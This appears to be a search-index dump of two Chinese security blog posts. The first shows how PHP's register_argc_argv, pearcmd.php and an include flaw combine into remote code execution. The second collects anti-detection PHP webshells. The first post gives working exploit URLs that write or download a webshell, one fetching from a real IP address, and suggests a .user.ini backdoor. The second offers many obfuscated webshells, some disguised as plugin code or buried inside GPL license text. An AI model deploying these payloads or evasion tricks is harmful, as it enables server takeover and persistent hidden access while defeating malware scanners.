if test \"x $PHP_PEAR_INSTALL_DIR \" ! = \"x\" ; then INCDIR = $PHP_PEAR_INSTALL_DIR INCARG = \"-d include_path= $PHP_PEAR_INSTALL_DIR \" else if test \"/usr/local/lib/php\" = '@' php_dir '@' ; then INCDIR = ` dirname $0 ` INCARG = \"\" else INCDIR = \"/usr/local/lib/php\" INCARG = \"-d include_path=/usr/local/lib/php\" fi fi exec $PHP -C -q $INCARG -d date.timezone = UTC -d output_buffering = 1 -d variables_order = EGPCS -d open_basedir = \"\" -d safe_mode = 0 -d register_argc_argv = \"On\" -d auto_prepend_file = \"\" -d auto_append_file = \"\" $INCDIR /pearcmd.php \" $@ \" \u901a\u8fc7\u770b\u6700\u540e\u4e00\u884c\u53ef\u4ee5\u77e5\u9053\u5176\u5b9e\u5b83\u662f\u901a\u8fc7php\u8c03\u7528\u4e86pearcmd.php,\u90a3\u4e48pearcmd.php\u4e2d$argv\u662f\u4ece\u54ea\u91cc\u6765\u7684\u5462,\u901a\u8fc7\u7b80\u5355\u67e5\u627e\u53ef\u4ee5\u770b\u5230\u5176\u8c03\u7528\u4e86\u53e6\u4e00\u4e2aphp\u6587\u4ef6\u4e2d\u67d0\u4e2a\u7c7b\u65b9\u6cd5: require_once 'Console/Getopt.php'; /* ... */ $argv = Console_Getopt::readPHPArgv(); \u518d\u6b21\u8ddf\u8fdbConsole/Getopt.php,\u627e\u5230\u8be5\u65b9\u6cd5\u7684\u5b9e\u73b0: public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = \"Could not read cmd args (register_argc_argv=Off?)\"; return PEAR::raiseError(\"Console_Getopt: \" . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } \u53ef\u4ee5\u770b\u5230\u83b7\u53d6$argv\u7684\u65b9\u5f0f\u662f global $argv --> $_SERVER['argv'] --> $GLOBALS['HTTP_SERVER_VARS']['argv'] \u540c\u65f6\u6211\u4eec\u77e5\u9053\u5f53\u6211\u4eecinclude\u4e00\u4e2a\u53ef\u4ee5\u88abphp\u89e3\u6790\u7684\u6587\u4ef6\u7684\u65f6\u5019,php\u4ee3\u7801\u4f1a\u88ab\u81ea\u52a8\u6267\u884c,\u8fd9\u6837\u5728register argc argv\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u5305\u542bpearcmd.php\u4e0e\u64cd\u63a7$_SERVER['argv']\u6765\u6267\u884cpear\u547d\u4ee4","title":"pear"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/#pear\u547d\u4ee4\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d","text":"\u6211\u4eec\u5148\u6765\u770b\u770b\u5982\u4f55\u901a\u8fc7pear\u547d\u4ee4\u6765\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d: \u5728\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2atmp.php \u4f7f\u7528python\u4e00\u53e5\u8bdd\u5f00\u542fhttp\u670d\u52a1\u5668: python -m SimpleHTTPServer 8080 \u901a\u8fc7\u6267\u884c pear \u547d\u4ee4\u83b7\u53d6\u5e2e\u52a9,\u53d1\u73b0\u5b58\u5728download\u9009\u9879,\u5c1d\u8bd5\u6267\u884c pear download http://127.0.0.1:8080/tmp.php ,\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u6210\u529f\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u8f7d\u4e86tmp.php: \u6709\u6ca1\u6709\u529e\u6cd5\u63a7\u5236\u4e0b\u8f7d\u76ee\u5f55?\u7b54\u6848\u662f\u4f7f\u7528install -R\u800c\u975edownload,\u5c1d\u8bd5\u6267\u884c pear install -R /var/www/html http://127.0.0.1:8080/tmp.php \u6210\u529f\u4e0b\u8f7d\u5230web\u76ee\u5f55\u4e0b\u5e76\u80fd\u591f\u8bbf\u95ee","title":"pear\u547d\u4ee4\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/#\u5982\u4f55\u63a7\u5236_serverargv","text":"\u5982\u4f55\u5f80$_SERVER['argv']\u4f20\u51652\u4e2a\u6216\u4ee5\u4e0a\u7684\u53c2\u6570?\u6d4b\u8bd5\u4e00\u4e0b: \u5e76\u4e0d\u80fd\u901a\u8fc7&\u4f5c\u4e3a$_SERVER['argv']\u7684\u5206\u5272,\u901a\u8fc7\u67e5\u9605\u8d44\u6599\u548c\u9605\u8bfb\u6e90\u7801: main/php_variables.c PHPAPI void php_build_argv ( const char * s , zval * track_vars_array ) { zval arr , argc , tmp ; int count = 0 ; if ( ! ( SG ( request_info ). argc || track_vars_array )) { return ; } array_init ( & arr ); /* Prepare argv */ if ( SG ( request_info ). argc ) { /* are we in cli sapi? */ int i ; for ( i = 0 ; i < SG ( request_info ). argc ; i ++ ) { ZVAL_STRING ( & tmp , SG ( request_info ). argv [ i ]); if ( zend_hash_next_index_insert ( Z_ARRVAL ( arr ), & tmp ) == NULL ) { zend_string_efree ( Z_STR ( tmp )); } } } else if ( s && * s ) { while ( 1 ) { const char * space = strchr ( s , '+' ); /* auto-type */ ZVAL_STRINGL ( & tmp , s , space ? space - s : strlen ( s )); count ++ ; if ( zend_hash_next_index_insert ( Z_ARRVAL ( arr ), & tmp ) == NULL ) { zend_string_efree ( Z_STR ( tmp )); } if ( ! space ) { break ; } s = space + 1 ; } } \u53ef\u4ee5\u77e5\u9053argv\u901a\u8fc7query_string\u53d6\u503c,\u5e76\u901a\u8fc7+\u4f5c\u4e3a\u5206\u5272\u7b26,\u5c1d\u8bd5\u4e00\u4e0b:","title":"\u5982\u4f55\u63a7\u5236$_SERVER['argv']"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/#\u56de\u5230\u9898\u76ee","text":"\u73b0\u5728\u56de\u5230\u9898\u76ee,\u6211\u4eec\u6240\u6709\u7684\u62fc\u56fe\u5df2\u7ecf\u51d1\u9f50\u4e86,\u5047\u5982\u5b58\u5728\u4ee5\u4e0b\u73af\u5883: \u5b89\u88c5\u4e86pear \u5f00\u542f\u4e86register argc argv \u5b58\u5728\u53ef\u63a7\u7684 include $_GET['f'] (\u5373\u4f7f\u662f include $_GET['f'].php ) \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u4e0a\u9762\u7684\u77e5\u8bc6\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u4ece\u800cgetshell: //\u901a\u8fc7\u672c\u5730\u76f4\u63a5\u5199\u5165webshell,\u6ce8\u610f\u8fd9\u91cc\u6700\u597d\u6293\u5305\u7136\u540e\u7528burpsuite\u6216\u8005\u76f4\u63a5curl\u6267\u884c\uff0c\u5426\u5219\u6d4f\u89c8\u5668\u4f1a\u5c06< ? > \u8f6c\u4e49 // config-create\u53ef\u4ee5\u76f4\u63a5\u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff0c\u4e14\u7b2c\u4e00\u4e2a\u53c2\u6570\u5fc5\u987b\u4ee5/\u5f00\u5934 http://ip:port/include.php?f=pearcmd&+config-create+/<?=phpinfo();?>+/tmp/evil.php // \u901a\u8fc7\u8fdc\u7a0b\u76f4\u63a5\u4e0b\u8f7dwebshell // web\u76ee\u5f55\u53ef\u5199 - http://ip:port/include.php?f=pearcmd&+install+-R+/var/www/html+http://ip:port/evil.php - http://ip:port/tmp/pear/download/evil.php // tmp\u76ee\u5f55\u53ef\u5199 - http://ip:port/include.php?f=pearcmd&+install+-R+/tmp+http://ip:port/evil.php - http://ip:port/include.php?f=/tmp/pear/download/evil &+install+-R+/tmp+ http://162.14.65.110:8888/1.php","title":"\u56de\u5230\u9898\u76ee"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/#\u540e\u95e8","text":"\u524d\u9762\u63d0\u5230register argc argv\u662fPHP INI PERDIR\u7684,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u65b0\u5efa\u4e00\u4e2a.user.ini\u8bbe\u7f6eregister argc argv\u4e3aOn\u7528\u4e8e\u7559\u540e\u95e8","title":"\u540e\u95e8"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/#\u6700\u540edocker","text":"\u5728php\u5b98\u65b9\u63d0\u4f9b\u7684\u955c\u50cf\u4e0b,\u9ed8\u8ba4\u662f\u4e0d\u4f7f\u7528php.ini\u7684(\u5728/usr/local/etc/php\u4e2d\u5b58\u5728php.ini-production\u548cphp.ini-development,\u9700\u8981\u624b\u52a8\u4fee\u6539\u4efb\u610f\u4e00\u4e2a\u6587\u4ef6\u540d\u4e3aphp.ini\u624d\u4f1a\u542f\u52a8php.ini,\u800c\u4e0a\u9762\u6211\u4eec\u63d0\u5230\u5728php.ini\u4e2dregister argc argv\u90fd\u8bbe\u7f6e\u4e3aOff) \u800cregister argc argv\u5728\u4e0d\u8bbe\u7f6e\u7684\u60c5\u51b5\u4e0b\u9ed8\u8ba4\u4e3aOn,\u90a3\u4e48\u5047\u5982\u6709\u4e00\u4e2a\u9ed8\u8ba4\u7684docker-php\u73af\u5883,\u5e76\u5b58\u5728\u53ef\u63a7\u7684 include $_GET['f'] (\u5373\u4f7f\u662finclude $_GET['f'].php),\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u5b9e\u73b0getshell","title":"\u6700\u540e:docker"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/","tags":["webshell","php"],"text":"webshell\u514d\u6740\u603b\u7ed3 # \u4ee5\u4e0b\u5185\u5bb9\u57fa\u4e8ePHP7 \u6700\u8fd1\u5bf9webshell\u7684\u514d\u6740\u673a\u5236\u4ea7\u751f\u4e86\u6d53\u539a\u7684\u5174\u8da3,\u4e8e\u662f\u5f00\u59cb\u8fdb\u884c\u7814\u7a76,\u53c2\u8003\u4e86\u7f51\u4e0a\u8bb8\u8bb8\u591a\u591a\u7684\u6587\u7ae0,\u4ee5\u4e0b\u662f\u6211\u5bf9webshell\u514d\u6740\u7684\u4e00\u4e9b\u603b\u7ed3 \u4f7f\u7528\u4ee5\u4e0b\u7f51\u7ad9\u53ca\u514d\u6740\u5de5\u5177\u8fdb\u884c\u514d\u6740\u6d4b\u8bd5(\u5e26\u661f\u53f7\u7684\u8868\u793a\u6211\u8ba4\u4e3a\u68c0\u6d4b\u6548\u679c\u6bd4\u8f83\u597d\u7684\u5de5\u5177/\u7f51\u7ad9): webshellchop \u957f\u4ead(*) \u6df1\u5ea6\u5b66\u4e60 WEBDIR+ \u767e\u5ea6(*) \u6cb3\u9a6c\u5728\u7ebf\u67e5\u6740 D\u76fe \u5b89\u5168\u72d7 \u53c2\u8003\u6587\u7ae0: https://www.freebuf.com/articles/web/155891.html https://bbs.symbo1.com/t/topic/94 https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html https://xz.aliyun.com/t/5152 http://webshell.cdxy.me/ \u4e0b\u7684\u8bc4\u8bba ... \u514d\u6740\u6280\u672f\u57fa\u7840 # \u524d\u8a00 # \u5bf9\u4e8ewebshell\u7684\u514d\u6740\u800c\u8a00,PHP5\u4e0ePHP7\u6709\u5f88\u5927\u7684\u4e0d\u540c,\u5728PHP7\u4e4b\u540e,assert\u8fd9\u4e2a\u9a6c\u513f\u5e38\u7528\u7684\u51fd\u6570\u53d8\u6210\u4e86\u4e00\u79cd\u7c7b\u4f3c\u4e8eeval\u7684\u8bed\u6cd5\u6784\u9020,\u8fd9\u4f7f\u5f97\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7\u52a8\u6001\u51fd\u6570\u7684\u65b9\u5f0f\u6765\u8c03\u7528assert,\u8fd9\u65e0\u7591\u662f\u5bf9\u514d\u6740\u7684\u4e00\u6b21\u6c89\u91cd\u6253\u51fb.(\u7ecf\u8fc7\u4e25\u683c\u6d4b\u8bd5,\u5728PHP7.0.33\u4e2d\u4f9d\u7136\u53ef\u4ee5,\u731c\u6d4b\u5e94\u8be5\u662fPHP7.1\u4ee5\u540e),\u56e0\u6b64\u6211\u4eec\u9700\u8981\u8f6c\u53d8\u601d\u8def\u4e86.\u6807\u6709(ALLKILL)\u5b57\u6837\u7684webshell\u901a\u8fc7\u4e86\u672c\u6587\u63d0\u5230\u7684\u6240\u6709\u67e5\u6740 \u53e6\u7c7b\u7684\u5165\u53e3 # \u6211\u4eec\u5e38\u89c1\u7684webshell\u5165\u53e3\u90fd\u662f GET, POST\u4e4b\u7c7b\u7684,\u4f46\u662f\u5176\u5b9e\u4e00\u5207\u7684\u5165\u53e3\u6211\u4eec\u90fd\u53ef\u4ee5\u8fdb\u884c\u5229\u7528,\u4ee5\u6b64\u6765\u9003\u8fc7\u67e5\u6740: $_GET $_POST $_COOKIE $_REQUEST $_SERVER \u5176\u4e2d\u7684\u67d0\u4e9b\u53c2\u6570\u53ef\u63a7,\u5982REQUEST METHOD,QUERY STRING,HTTP USER AGENT\u7b49 session_id() \u8fd9\u4e2a\u6bd4\u8f83\u7279\u6b8a,\u4f46\u662f\u4f9d\u7136\u53ef\u4ee5\u5229\u7528 $_FILE $GLOBALS getallheaders() get defined vars() get defined functions() \u4e0b\u9762\u4e3e\u51e0\u4e2a\u4f8b\u5b50: <?php @ eval ( urldecode ( $_FILES [ 'file' ][ 'name' ])); // \u8be5\u9a6c\u4f1a\u628a\u53cc\u5f15\u53f7\u7ed9URL\u7f16\u7801, // \u56e0\u6b64\u5982\u679cpayload\u4e2d\u6709\u53cc\u5f15\u53f7\u5219\u9700\u8981\u5957\u4e00\u5c42urldecode @ eval ( urldecode ( $_FILES [ 'file' ][ 'type' ])); // \u8be5p\u9a6c\u4f1a\u628a\u5206\u53f7\u5403\u6389,\u56e0\u6b64\u9700\u8981\u5bf9\u5206\u53f7\u8fdb\u884c\u7f16\u7801\u5982URL\u7f16\u7801(%3B) //\u56e0\u6b64\u9700\u8981\u5957\u4e00\u5c42urldecode ?> <?php @ eval ( hex2bin ( $_SERVER [ 'REQUEST_METHOD' ])); // \u8be5\u9a6c\u901a\u8fc7\u8bbe\u7f6e\u8bf7\u6c42\u65b9\u5f0f\u6765\u5b9e\u73b0\u6267\u884c,\u7531\u4e8e\u7b26\u53f7\u95ee\u9898 // \u9700\u8981\u7528bin2hex\u5bf9payload\u8fdb\u884c\u7f16\u7801 ?> <?php $a = $_SERVER [ 'QUERY_STRING' ]; //\u4f8b\u5b50 ?php=info()& $a = str_replace ( \"&\" , \";\" , $a ); $a = str_replace ( \"=\" , \"\" , $a ); @ eval ( $a ); ?> <?php @ eval ( getallheaders ()[ 'Referer' ]); <?php // (ALLKILL) error_reporting ( 0 ); eval ( null . implode ( reset ( get_defined_vars ()))); // php>=5.5 ?a=echo 1; ?> <?php // (ALLKILL) error_reporting ( 0 ); define ( \"SS\" , \"session_start\" ); function result ( $arg ) { return 1 > 0 ? @ $arg : 0 ; } function hex22bin ( $data ) { $len = strlen ( $data ); return pack ( \"H\" . $len , $data ); } class deal { function combine_var ( $default = NULL ){ if ( ! constant ( \"SS\" )) { return $default ; } if ( ! preg_match ( '/\\w+/' , $this -> sess )) { throw new Exception ( \" $this->sess error\" ); } $results = null ; //trash $results = result ( $this -> sess ); @ eval ( \" $this->sess \" ); // PHP>=5.4 // Cookie: PHPSESSID=706870696e666f28293b == phpinfo(); hex2bin(\"phpinfo();\") => 706870696e666f28293b } function __construct ( $arg ){ $this -> sess = $arg ; return $this -> combine_var (); } } $son = constant ( \"SS\" ); $son (); $sessionid = session_id (); $sessionid = hex22bin ( $sessionid ); $deals = new deal ( $sessionid ); ?> \u5176\u4e2d\u6bd4\u8f83\u503c\u5f97\u6ce8\u610f\u7684\u662fGLOBALS,get defined vars(),getallheaders() GLOBALS,get defined vars(): \u4e00\u4e2a\u662f\u8d85\u5168\u5c40\u53d8\u91cf,\u4e00\u4e2a\u662f\u51fd\u6570,\u8fd4\u56de\u503c\u90fd\u662f\u4e00\u4e2a\u591a\u7ef4\u6570\u7ec4,\u5305\u542b\u4e86 GET, POST\u7b49\u5176\u4ed6\u8d85\u5168\u5c40\u53d8\u91cf,\u53ef\u4ee5\u501f\u6b64\u6765\u5bf9\u88f8\u9732\u7684\u8f93\u5165\u8fdb\u884c\u5d4c\u5957,\u5982\u7528GLOBALS[' POST'][1]\u4ee3\u66ff POST[1] getallheaders(): \u83b7\u53d6\u6240\u6709\u7684\u8bf7\u6c42\u5934(\u8be5\u51fd\u6570\u62e5\u6709\u4e00\u4e9b\u9650\u5236,\u5177\u4f53\u8bf7\u53c2\u7167 \u8fd9\u91cc ) \u540c\u6837\u53ef\u4ee5\u501f\u6b64\u6765\u5c1d\u8bd5\u9003\u8fc7\u5bf9\u8f93\u5165\u7684\u68c0\u67e5 \u8fd9\u91cc\u518d\u8bf4\u51e0\u4e2aPHP\u7684\u51fd\u6570 pos(),current(),reset():\u8fd9\u4e09\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u90fd\u662f\u4f20\u5165\u6570\u7ec4\u7684\u4e00\u4e2a\u5143\u7d20 next():\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u4f20\u5165\u6570\u7ec4\u7684\u7b2c\u4e8c\u4e2a\u5143\u7d20 end():\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u4f20\u5165\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20 implode():\u53ef\u4ee5\u5c06\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u62fc\u63a5\u8d77\u6765,\u5982\u62fc\u63a5\u6210\u5b57\u7b26\u4e32 \u53ef\u4ee5\u770b\u5230 evil5.php \u4e2d\u6211\u4eec\u4ec5\u4ec5\u5bf9\u8f93\u5165\u8fdb\u884c\u5904\u7406,\u62fc\u63a5null\u5c31\u8eb2\u8fc7\u4e86\u6240\u6709\u7684\u67e5\u6740. \u9664\u4e86\u4e0a\u8ff0\u65b9\u6cd5\u4e4b\u5916,\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u4ece\u4e0d\u540c\u7684\"\u95e8\"\u8fdb\u5165,\u5982\u6267\u884c\u7cfb\u7edf\u547d\u4ee4: system() exec() shell_exec() passthru() proc_open() \u53cd\u5f15\u53f7\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 \u6216\u8005\u4f7f\u7528\u4e00\u4e9b\u533f\u540d\u51fd\u6570,\u52a8\u6001\u8c03\u7528\u51fd\u6570,\u56de\u8c03\u51fd\u6570: call user func call user func_array array_filter array_map uasort, uksort array_reduce array_udiff array_walk array walk recursive preg replace, mb ereg_replace preg_filter register shutdown function register tick function filter_var filter var array \u7c7b\u7684\u53cd\u5c04->invoke() include file get contents create function // \u6211\u5c1d\u8bd5\u7528create function\u6765\u521b\u9020\u514d\u6740webshell,\u4f46\u4f3c\u4e4e\u603b\u662f\u7ed5\u4e0d\u8fc7\u957f\u4ead <?php // (ALLKILL) error_reporting ( 0 ); function compare_by_area ( $a , $b ) { $areaA = substr ( $a -> width . $a -> height , 4 ); $areaB = substr ( $b -> width . $b -> height , 4 ); if ( $areaA ( $areaB )) { return - 1 ; } elseif ( $areaA == $areaB ) { return 1 ; } else { return 0 ; } } $array1 = array ( new stdclass ); $array1 [ 0 ] -> width = 'code' ; $array1 [ 0 ] -> height = 'sys' . 'tem' ; $array2 = array ( new stdclass ); $array2 [ 0 ] -> width = 'args' ; $array2 [ 0 ] -> height = pos ( next ( $GLOBALS )); array_udiff ( $array1 , $array2 , 'compare_by_area' ); // PHP >=5.3 \u603b\u7684\u6765\u8bf4,\u5165\u53e3\u5343\u4e07\u6761,\u5b89\u5168\u7b2c\u4e00\u6761,\u514d\u6740\u4e0d\u5230\u4f4d,\u9762\u58c1\u7a7a\u6d41\u6cea.\u5404\u4f4d\u5e08\u5085\u4eec\u53ef\u4ee5\u81ea\u884c\u6d4b\u8bd5\u4e0b\u8fd9\u4e9b\u5165\u53e3 \u53d8\u5f62\u4e0e\u4f2a\u88c5 # \u53d8\u5f62\u53ef\u80fd\u662f\u6211\u4eec\u6700\u5e38\u89c1\u7684bypass\u624b\u6bb5\u4e86,\u4f46\u4ecd\u7136\u662f\u6211\u4eec\u901a\u8fc7\u52a8\u6001\u68c0\u6d4b\u7684\u597d\u624b\u6bb5,PHP\u4e2d\u81ea\u5e26\u4e86\u5927\u91cf\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u5904\u7406\u53d8\u5f62\u4e0e\u7f16\u7801\u7684\u51fd\u6570,\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u5bf9\u6211\u4eec\u7684webshell\u8fdb\u884c\u64cd\u4f5c \u4ee5\u4e0b\u662f\u4e00\u4e9bPHP\u81ea\u5e26\u7684\u51fd\u6570: substr_replace substr strtr str_rot13 base64_encode chr bin2hex strrev urlencode json_encode pack gzcompress/gzdeflate/gzencode ... \u53e6\u5916\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5341\u516d\u8fdb\u5236/\u516b\u8fdb\u5236\u7f16\u7801,\u53d6\u53cd\uff0c\u5f02\u6216\uff0c\u52a0\u5bc6\uff0c\u5e8f\u5217\u5316,\u51fd\u6570\u540d\u5927\u5c0f\u5199\u7b49\u7b49\u6765\u5bf9webshell\u8fdb\u884c\u53d8\u5f62,\u4f8b\u5982\u5229\u7528\u5341\u516d\u8fdb\u5236\u4e0e\u516b\u8fdb\u5236\u6df7\u7f16\u7684ALLKILL webshell: <?php // (ALLKILL) \u53c2\u8003https://www.freebuf.com/articles/web/155891.html\u4e2d\u8fdb\u5236\u8f6c\u6362\u65b9\u5f0f $v230c590 = \" \\x62\\x61\\163\\x65\\x36\\x34\\137\\144\\145\\x63\\x6f\\144\\145 \" ; @ eval ( '' . $v230c590 ( null . next ( post ( $GLOBALS )); \u53c8\u5982\u5229\u7528\u9762\u5411\u5bf9\u8c61\u7279\u6027,\u5b57\u7b26\u62fc\u63a5,\u52a8\u6001\u8c03\u7528\u53d8\u5f62\u7684ALLKILL webshell: <?php // (ALLKILL) $name = basename ( __FILE__ ); class combine { function __construct ( $var , $srcname ) { $this -> var = $var ; $this -> name = $srcname ; $this -> cookie = get_class ( $this ); $this -> cookie = $this -> cookie [ 2 ]; } function __combine ( $yum ) { $run = $this -> var ; $run .= $this -> name [ 3 ]; $run .= 'e' . $this -> cookie ; $this -> yum = $yum ; $run ( '' . $this -> yum ); } } $result = new combine ( 'sys' , $name ); // php5 php7 success die ( $result -> __combine ( $_GET [ 2333 ])); \u4f2a\u88c5\u5219\u662f\u4e00\u79cd\u6709\u6548\u901a\u8fc7\u9759\u6001\u68c0\u6d4b\u7684\u65b9\u6cd5(\u867d\u7136\u6709\u70b9\u7384\u5b66,\u4f8b\u5982D\u76fe\u4f3c\u4e4e\u6709\u5bf9\u6587\u4ef6\u884c\u6570\u8fdb\u884c\u5224\u65ad),\u6211\u4eec\u5c06webshell\u4f2a\u88c5\u6210\u4e00\u4e2a\u6b63\u5e38\u7684\u529f\u80fd,\u5e76\u914d\u4e0a\u63a9\u4eba\u8033\u76ee\u7684\u540d\u5b57,\u751a\u81f3\u53ef\u4ee5\u9003\u8fc7\u7ba1\u7406\u5458\u7684\u68c0\u67e5,\u4f8b\u5982\u4e0b\u9762\u51e0\u4e2a\u4f8b\u5b50: <?php /** * new plugin * @author xxcms * @package Glimmer * @subpackage PluginsShared */ /** * get a compiler parameter and echo to console */ function get_compiler_param ( $params , $index , $default = null ) { if ( ! isset ( $params [ $index ])) { return $default ; } if ( ! preg_match ( '/^([\\'\"]?)[a-zA-Z0-9](\\\\1)/' , $params [ $index ])) { throw new Exception ( \" $index is not a literal\" ); } $t = null ; eval ( \" \\$ t = \" . $params [ $index ]); return $t ; } $params = array ( 'code' => $_GET [ 2333 ]); $a = get_compiler_param ( $params , 'code' , \"whoami\" ); if ( isset ( $_GET [ 'print' ])){ echo ( \"<script>console.log('\" . $a . \"');</script>\" ); } <?php // \u8fd9\u4e2a\u9a6c\u7531\u4e8eextract\u53ca\u660e\u663e\u7684\u52a8\u6001\u8c03\u7528\u8fc7\u4e0d\u4e86\u514d\u6740,\u4f46\u662f\u4ecd\u4e0d\u5931\u4e3a\u4e00\u79cd\u597d\u601d\u8def // copy from http://webshell.cdxy.me/ /* GNU GENERAL PUBLIC LICENSE Version 3, 29 June 2007 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/> Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed. Preamble The GNU General Public License is a free, copyleft license for software and other kinds of works. The licenses for most software and other practical works are designed to take away your freedom to share and change the works. By contrast, the GNU General Public License is intended to guarantee your freedom to share and change all versions of a program--to make sure it remains free software for all its users. We, the Free Software Foundation, use the GNU General Public License for most of our software; it applies also to any other work released this way by its authors. You can apply it to your programs, too. When we speak of free software, we are referring to freedom, not price. Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for them if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs, and that you know you can do these things. To protect your rights, we need to prevent others from denying you these rights or asking you to surrender the rights. Therefore, you have certain responsibilities if you distribute copies of the software, or if you modify it: responsibilities to respect the freedom of others. For example, if you distribute copies of such a program, whether gratis or for a fee, you must pass on to the recipients the same freedoms that you received. You must make sure that they, too, receive or can get the source code. And you must show them these terms so they know their rights. Developers that use the GNU GPL protect your rights with two steps: (1) assert copyright on the software, and (2) offer you this License giving you */ extract ( $_COOKIE ); /* copy, distribute and/or modify it. For the developers' and authors' protection, the GPL clearly explains that there is no warranty for this free software. For both users' and authors' sake, the GPL requires that modified versions be marked as changed, so that their problems will not be attributed erroneously to authors of previous versions. Some devices are designed to deny users access to install or run modified versions of the software inside them, although the manufacturer can do so. This is fundamentally incompatible with the aim of protecting users' freedom to change the software. The systematic pattern of such abuse occurs in the area of products for individuals to use, which is precisely where it is most unacceptable. Therefore, we have designed this version of the GPL to prohibit the practice for those products. If such problems arise substantially in other domains, we stand ready to extend this provision to those domains in future versions of the GPL, as needed to protect the freedom of users. Finally, every program is threatened constantly by software patents. States should not allow patents to restrict development and use of software on general-purpose computers, but in those that do, we wish to avoid the special danger that patents applied to a free program could make it effectively proprietary. patents applied to GPL assures that patents cannot be used to render the program non-free. The precise terms and conditions for copying, distribution and modification follow. TERMS AND CONDITIONS 0. Definitions. \"This License\" refers to version 3 of the GNU General Public License. \"Copyright\" also means copyright-like laws that apply to other kinds of works, such as semiconductor masks. \"The Program\" refers to any copyrightable work licensed under this License. Each licensee is addressed as \"you\". \"Licensees\" and \"recipients\" may be individuals or organizations. To \"modify\" a work means to copy from or adapt all or part of the work in a fashion requiring copyright permission, other than the making of an exact copy. The resulting work is called a \"modified version\" of the earlier work or a work \"based on\" the earlier work. A \"covered work\" means either the unmodified Program or a work based on the Program. To \"propagate\" a work means to do anything with it that, without permission, would make you directly or secondarily liable for infringement under applicable copyright law, except executing it on a computer or modifying a private copy. Propagation includes copying, distribution (with or without modification), making available to the public, and in some countries other activities as well. To \"convey\" a work means any kind of propagation that enables other parties to make or receive copies. Mere interaction with a user through a computer network, with no transfer of a copy, is not conveying. An interactive user interface displays \"Appropriate Legal Notices\" to the extent that it includes a convenient and prominently visible feature that (1) displays an appropriate copyright notice, and (2) tells the user that there is no warranty for the work (except to the extent that warranties are provided), that licensees may convey the work under this License, and how to view a copy of this License. If the interface presents a list of user commands or options, such as a menu, a prominent item in the list meets this criterion. 1. Source Code. The \"source code\" for a work means the preferred form of the work for making modifications to it. \"Object code\" means any non-source form of a work. A \"Standard Interface\" means an interface that either is an official standard defined by a recognized standards body, or, in the case of interfaces specified for a particular programming language, one that is widely used among developers working in that language. The \"System Libraries\" of an executable work include anything, other than the work as a whole, that (a) is included in the normal form of packaging a Major Component, but which is not part of that Major Component, and (b) serves only to enable use of the work with that Major Component, or to implement a Standard Interface for which an implementation is available to the public in source code form. A \"Major Component\", in this context, means a major essential component (kernel, window system, and so on) of the specific operating system (if any) on which the executable work runs, or a compiler used to produce the work, or an object code interpreter used to run it. The \"Corresponding Source\" for a work in object code form means all the source code needed to generate, install, and (for an executable work) run the object code and to modify the work, including scripts to control those activities. However, it does not include the work's System Libraries, or general-purpose tools or generally available free programs which are used unmodified in performing those activities but which are not */ @ $PC4E20 &&@ $F ( $A , $B ); /*. For example, Corresponding Source the work, and the source code for shared libraries and dynamically linked subprograms that the work is specifically designed to require, such as by intimate data communication or control flow between those subprograms and other parts of the work. The 